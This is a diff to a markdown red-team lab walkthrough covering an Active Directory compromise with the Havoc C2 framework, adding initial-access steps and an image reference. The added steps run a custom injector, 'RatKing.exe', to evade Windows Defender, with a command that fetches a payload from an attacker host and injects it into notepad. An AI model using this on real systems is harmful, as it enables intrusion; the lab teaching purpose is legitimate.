@@ -147,7 +147,14 @@ Here is the video walkthrough regarding Setting Up an attack in Teamserver inclu
 
 {% include video id="ORPrpKvO56M" provider="youtube" %}
 
-Some texts here...
+In our initial compromise, we need to consider whether our payloads successfully bypass Windows Defender. Due to fact that Havoc default executable is heavily detected by Defender, therefore, we will use our custom injector that had been introduced in our **"Chapter 2: OPSEC and Evasion"**. We will implement 4 steps for initial access. In our case, `RatKing.exe` will be utilized.
+
+1. Compiled `RatKing.exe` in Visual Studio in Attacker Windows.
+2. Transfer `RatKing.exe` from Attacker Windows to Attacker Linux.
+3. Transfer `RatKing.exe` from Attacker Linux to WORKSTATION-01.
+4. Run `RatKing.exe` with the syntax: `RatKing.exe -u "http://<Attacker Linux IP>:<PORT>/<Payload>" -t notepad`.
+5. Return back to Attacker Linux, check the Havoc Teamserver whether a demon is called back.
+6. If the demon is not yet spawned, check the web log in `updog` or check the syntax of `RatKing.exe` command. 
 
 Here is the video walkthrough regarding Initial Access Path using custom shellcode injector.
 
@@ -718,12 +725,18 @@ In WORKSTATION-01 or WORKSTATION-02 demon, type the following commands.
 HAVOC{c7394fc9e54b0e362b5a610e0ef6a3e0}
 ```
 
-Here is a great blog by Rastamouse discuss about [NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/). We will continue update this section if any method available without knowing the credentials of Domain Admins. Happy Hacking!
+Here is a great blog by Rastamouse discuss about [NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/). We will continue update this section if any method available without knowing the credentials of Domain Admins.
+
+The whole compromise process should be look such as the figure below.
+
+![image](https://user-images.githubusercontent.com/107750005/223196736-da6a9aac-b6ff-479b-8b27-b5fc9f8d89e5.png)
+
+This image above is referenced to the [youtube video demonstration](https://www.youtube.com/watch?v=a8ghTH_fT_o&t=8s&ab_channel=5pider) by [C5pider](https://github.com/Cracked5pider). 
 
 ## 🗣️ Conclusion
 Throughout this blog, we had covered a short introduction about what is Active Directory and a little sneak peak about Kerberos authentication. Then, we ensure that our AD lab environment is totally functional by doing some network verifications before diving into the fun stuffs. Moreover, we have gone through how attackers can bypass Windows AV and get a callback host by utilizing HAVOC framework. Besides that, one example attack in each stage had been discussed including ***unquoted service paths***, ***unconstrained delegation***, ***pivoting attacks***, etc. and eventually compromise the whole domain.
 
-In conclusion, I hope this article is detailed enough to benefit people for learning interesting topics and apply these gains to related work such as education, certification exams, projects, home lab practice, and more. (but not for illegal actions 💀 plzzz...)
+In conclusion, I hope this article is detailed enough to benefit people for learning interesting topics and apply these gains to related work such as education, certification exams, projects, home lab practice, and more. (but not for illegal actions 💀 plzzz...) Happy Hacking!
 
 ## 🟦 References
 
